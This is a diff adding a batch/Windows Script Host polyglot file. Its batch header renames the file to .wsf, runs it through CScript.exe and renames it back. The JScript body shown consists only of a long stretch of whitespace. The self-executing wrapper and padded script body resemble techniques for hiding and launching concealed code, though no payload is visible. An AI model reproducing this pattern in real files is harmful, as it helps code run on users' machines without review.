@@ -1,0 +1,19 @@
+@(
+REN "%~f0" "%~nx0.wsf"
+CScript.exe //NoLogo "%~f0.wsf" %*
+REN "%~f0.wsf" "%~nx0"
+GOTO :EOF
+)
+
+
+<package>
+
+  <job id="yrdy">
+    <script language="JScript">
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+
+
+
+    </script>
+  </job>
+</package>
